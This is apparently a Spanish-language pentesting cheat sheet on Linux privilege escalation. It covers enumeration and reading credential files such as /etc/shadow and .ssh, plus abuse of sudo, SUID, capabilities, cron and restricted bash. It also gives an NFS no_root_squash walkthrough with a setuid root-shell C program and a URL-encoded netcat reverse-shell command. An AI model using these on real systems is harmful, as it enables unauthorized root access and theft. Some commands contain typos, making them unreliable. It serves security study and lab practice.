## Enumeración básica

``` bash
*** ls -la a la raiz del sistema siempre ***
id # privilegios usuario actual (lxd o docker)
uname -a # información kernel
su - <user> # no perder las variables
lsb_release -a # enumerar info del S.O
env # para ver las variables del sistema
ss -tulpn # ver puertos/servicios internos que hay abiertos
netstat -a # muestra todos los puertos que estan en escucha y conectados
ps aux # procesos ejecutandose en el sistema de manera ordenada
cat /etc/login.defs | grep “ENCRYPT_METHOD” # ver que tipo de encriptación se utiliza en el sistema en los hashes de las passwords
hash-indentifier # para ver que tipo de encryptacion tiene el hash
hashid <hash>
ps -eo user,command # reporta todos los comandos que se están ejecutando en el sistema
watch -d 'ps -ef # Procesos a tiempo real como pspy64'
#shell
python3 -c 'import ptpy;pty.spawn("/bin/bash")'
python -c 'import ptpy;pty.spawn("/bin/bash")'
ps aux --sort="-%mem" |more # procesos ejecutanose
curl "http://192.168.1.2/login.php" --data-urlencode 'username=admin&password=pass123' # Enviar datos url encodeados 
php -r 'print urlencode("nc -e /bin/sh 192.168.218.147 5344");' ;echo # Encodear datos
```

### Abusando de grupos

- [lxd/lxc](https://j4ckie0x17.gitbook.io/notes-pentesting/escalada-de-privilegios/linux/abusando-grupo-lxd-lxc)

- [pcap](https://j4ckie0x17.gitbook.io/notes-pentesting/escalada-de-privilegios/linux/abusando-grupo-pcap)

## Comprobar rutas importantes


``` bash
# Rutas core
/etc/passwd | cut ":" -f 1
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/home/<user>/
/home/<user>/.ssh
/home/<user>/bash_history
# Comprobar que haya subdominios
/etc/nginx/sites-available
/etc/apache2/sites-available
```

### Enumeración automatizada

- LinPeas: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

- Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

- LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)


## Abuso permisos sudo

``` bash
sudo -l # comprobar que el usuario actual tiene capacidad de ejecutar un binario como root
```

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FmvX9l4BBwhij56cwtYtY%252Fimagen.png%3Falt%3Dmedia%26token%3D911accba-2f48-4531-b6e7-87466a56c75e&width=768&dpr=4&quality=100&sign=6cb66ffe5970351094f92961a9c95f60738488c2c4880b85f74a21d5761def41)

Si nos encontramos con env_keep+=LD_PRELOAD en el sudo -l podríamos hacer que cualquier programa utilice librerías compartidas, para saber como explotarlo accede a este [link](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

## Abuso permisos SUID

``` bash
find / -perm -4000 2>/dev/null # enumerar privilegios SUID
find / -perm -4000 2>/dev/null | grep “etc” # enumerar por archivos que estenexi en la ruta /etc/
find / -perm -4000 -o- -perm -2000 -o- -perm -6000 # enumerar grupos
```

## Encontrar carpetas/archivos que podemos escribir


``` bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u # directorios
find / -writable 2>/dev/null | grep -v -i -E 'proc|run|sys|dev' # archivos
```

## Enumerar tareas en proceso (cronjob)

``` bash
cat /etc/crontab o crontab -l
cat /var/spool/cron # para las cronjobs del sistema
cat /etc/anacron
systemctl list-timers # ver tareas que se van a ejecutar en los proximos minutos
```

### Monitorizador comandos script bash

``` bash
#!/bin/bash
old_process=$(ps -eo user,command)
while true; do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
        old_process=$new_process
done
```

## Abuso Capabilites

``` bash
getcap -r / 2>/dev/null # de forma recursiva ver las capabilities que hayan definidas en el sistema
setcap -r <ruta> # quitar capabilty
setcap cap_setuid+ep <ruta del archivo> # asignar SUID permisios a la ruta
```

## Bypass restricted bash


``` bash
ssh user@ip bash # y después realizamos el tratamiento de la TTY
ssh user@ip 'bash --norc --noprofile'
```

## NFS

NFS (Network File System) es un protocolo de red utilizado para compartir sistemas de archivos entre computadoras. En el contexto de la escalada de privilegios en Linux, NFS puede ser utilizado como una técnica para obtener acceso a archivos o directorios que no son accesibles por defecto para un usuario sin privilegios.

Y se encuentra en este archivo:

``` bash
/etc/exports
```

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252Fl1fXjFHQP55lXPnocFuR%252Fimagen.png%3Falt%3Dmedia%26token%3D7a51ba38-5067-444e-9a5d-06877c9c97b8&width=768&dpr=4&quality=100&sign=c15bd4d657ad9ccb963bc959bd16549948a4ccf50fa8233fc3373029468be1c4)

El elemento crítico para este vector de escalada de privilegios es la opción "no_root_squash" que puede ver arriba. De forma predeterminada, NFS cambiará el usuario raíz a nfsnobody y eliminará cualquier archivo para que no funcione con privilegios de raíz. Si la opción "no_root_squash" está presente en un recurso compartido grabable, podemos crear un ejecutable con el conjunto de bits SUID y ejecutarlo en el sistema de destino.

Primero tenemos que enumerar los recursos compartidos montables de la máquina victima:

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FjDUVGqE8KvN7IZUsExvR%252Fimagen.png%3Falt%3Dmedia%26token%3Dbc38b2eb-e69a-4f50-a53c-fd4fef73bfa8&width=768&dpr=4&quality=100&sign=52678f29251f4916884580faea324db856ad289071b5d238bbd405f4bea68471)

Montaremos un recurso compartido "no_root_squash" en nuestra máquina local

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FFdUXoLfjz6IQgPjmnGND%252Fimagen.png%3Falt%3Dmedia%26token%3D92297b52-d145-4bdd-8a07-522736f71f51&width=768&dpr=4&quality=100&sign=c0313f43f2eda927dc020ccce7bc357859209bdac901a7b140367cd65eb5dbc0)

Creamos un script con C con una /bin/bash y que nos de root cuando se ejecute en la victima


``` bash
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Lo compilamos y le damos permisos SUID

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252F8V6t3iClp332K10qdGIf%252Fimagen.png%3Falt%3Dmedia%26token%3Dd250d589-cdfb-4ce2-8702-b46f783f78a1&width=768&dpr=4&quality=100&sign=df97bc0e3b5e6c03a7a23a25552b7f0b875d93c09e1a9e254912b76dcfbc9563)

No hace falta transferirlos por qué ya está en la máquina victima ya que hemos estado trabajando en ella mediante un recurso compartido.

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FwryJBgnXkQGYibiqyO4r%252Fimagen.png%3Falt%3Dmedia%26token%3D938aab09-bf93-487b-a872-b2ce64fbcf63&width=768&dpr=4&quality=100&sign=532d8c89d1fdb50c26b2936655e026dcc08d27bc0a607739fe0da6336cf40fc8)

Lo ejecutamos y somos root

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FzK261O2yZrUKcsKj9CSV%252Fimagen.png%3Falt%3Dmedia%26token%3D6cde92a9-5831-4cff-8545-c1056488994b&width=300&dpr=4&quality=100&sign=f9410a7fa0ef3e982394f81c1ecbde73bf1d5ec3368b43fb7abe42446593b6b3)

## Kernel exploits

```
uname -a
lsb_release -a
```

### Consejos

1. Se muy especifico a la hora de buscar la version del kernel en exploitdb,google o searchsploit.

2. Entiende muy bien el exploit antes de ejecutarlo, a veces se tienen que modificar.

3. Puede que el script se tenga que interactuar en el futuro así que cuidado.

4. Para traspasar el exploit a la máquina victima, como siempre la carpeta /tmp y en tu máquina abres un servidor `python3 -m http.server 9000`


Si creemos que puede que el sistema comprometido es vulnerable de kernel, como un script que no sea de ese mismo kernel lo ejecutemos en el sistema puede romperlo.

Para asegurarnos tenemos [[Linux Exploit Suggester)](https://github.com/jondonas/linux-exploit-suggester-2|LES (Linux Exploit Suggester)]] que nos ayudará a saber cual es el CVE correcto para ejecutar.

## Analizar archivos

``` bash
ltrace <archivo> # se utiliza para rastrear las llamadas a funciones bibliotecarias que hace un programa en tiempo de ejecución.
strings <archivo> #  busca en un archivo binario (como un archivo ejecutable o una biblioteca compartida)
```
